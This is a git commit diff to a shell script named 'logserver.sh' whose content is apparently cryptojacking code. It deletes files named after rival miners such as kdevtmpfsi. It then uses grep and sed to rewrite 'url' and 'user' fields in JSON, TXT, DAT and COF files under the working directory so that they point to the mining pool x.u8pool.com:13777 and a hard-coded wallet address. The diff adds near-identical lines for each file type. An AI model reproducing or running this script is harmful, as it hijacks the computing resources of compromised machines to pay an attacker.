1fa1edac08cb7c15af925d8d7b23668d83846077
teshushu <905353149@qq.com>
2023-01-27 04:28:48 +0800

    Update logserver.sh

--- Bash/logserver.sh
+++ Bash/logserver.sh
@@ -65,4 +65,10 @@ rm -f svcworkmanager
 rm -f newsvc.sh
 rm -f kdevtmpfsi
 grep -r "x.u8pool.com:13777" ./ && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13777",/' `grep url -rl ./`
-grep -r "4AYpmqXKbtMTbBXgkFwCCUE1Vb6GqeetqMWN3wXSoXwoSqKd2pr78L7VUHMECGg6H93EAADjgSomWP9GFCgvdGfD4xmfXE9" ./ && echo "yes" || sed -i 's/"user": *"[^"]*",/"user": "4AYpmqXKbtMTbBXgkFwCCUE1Vb6GqeetqMWN3wXSoXwoSqKd2pr78L7VUHMECGg6H93EAADjgSomWP9GFCgvdGfD4xmfXE9",/' `grep user -rl ./`
+grep -r "4AYpmqXKbtMTbBXgkFwCCUE1Vb6GqeetqMWN3wXSoXwoSqKd2pr78L7VUHMECGg6H93EAADjgSomWP9GFCgvdGfD4xmfXE9" ./ && echo "yes" || sed -i 's/"user": *"[^"]*",/"user": "4AYpmqXKbtMTbBXgkFwCCUE1Vb6GqeetqMWN3wXSoXwoSqKd2pr78L7VUHMECGg6H93EAADjgSomWP9GFCgvdGfD4xmfXE9",/' `grep user -rl --include="*.json" ./`
+
+grep -r "4AYpmqXKbtMTbBXgkFwCCUE1Vb6GqeetqMWN3wXSoXwoSqKd2pr78L7VUHMECGg6H93EAADjgSomWP9GFCgvdGfD4xmfXE9" ./ && echo "yes" || sed -i 's/"user": *"[^"]*",/"user": "4AYpmqXKbtMTbBXgkFwCCUE1Vb6GqeetqMWN3wXSoXwoSqKd2pr78L7VUHMECGg6H93EAADjgSomWP9GFCgvdGfD4xmfXE9",/' `grep user -rl --include="*.txt" ./`
+
+grep -r "4AYpmqXKbtMTbBXgkFwCCUE1Vb6GqeetqMWN3wXSoXwoSqKd2pr78L7VUHMECGg6H93EAADjgSomWP9GFCgvdGfD4xmfXE9" ./ && echo "yes" || sed -i 's/"user": *"[^"]*",/"user": "4AYpmqXKbtMTbBXgkFwCCUE1Vb6GqeetqMWN3wXSoXwoSqKd2pr78L7VUHMECGg6H93EAADjgSomWP9GFCgvdGfD4xmfXE9",/' `grep user -rl --include="*.dat" ./`
+
+grep -r "4AYpmqXKbtMTbBXgkFwCCUE1Vb6GqeetqMWN3wXSoXwoSqKd2pr78L7VUHMECGg6H93EAADjgSomWP9GFCgvdGfD4xmfXE9" ./ && echo "yes" || sed -i 's/"user": *"[^"]*",/"user": "4AYpmqXKbtMTbBXgkFwCCUE1Vb6GqeetqMWN3wXSoXwoSqKd2pr78L7VUHMECGg6H93EAADjgSomWP9GFCgvdGfD4xmfXE9",/' `grep user -rl --include="*.cof" ./`
